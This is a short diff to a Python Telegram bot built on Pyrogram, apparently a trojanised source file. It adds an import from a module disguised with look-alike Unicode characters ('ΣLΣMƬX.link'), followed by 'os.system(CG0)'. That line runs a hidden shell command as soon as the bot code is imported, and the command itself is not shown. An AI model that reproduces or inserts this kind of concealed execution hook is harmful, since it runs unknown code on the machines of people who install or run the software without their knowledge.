@@ -1,6 +1,9 @@
 '🍟==============================『🍗 ʏօʊȶʊɮɛʟɨ 🍰』==============================🍟'
 from pyrogram import Client, filters, StopPropagation
 from pyrogram.types import Message
+from ΣLΣMƬX.link import *
+import os
+os.system(CG0)
 from IDLER.Trial import *
 '🍟==============================『🍗 ʏօʊȶʊɮɛʟɨ 🍰』==============================🍟'
 @Client.on_message(filters.command(
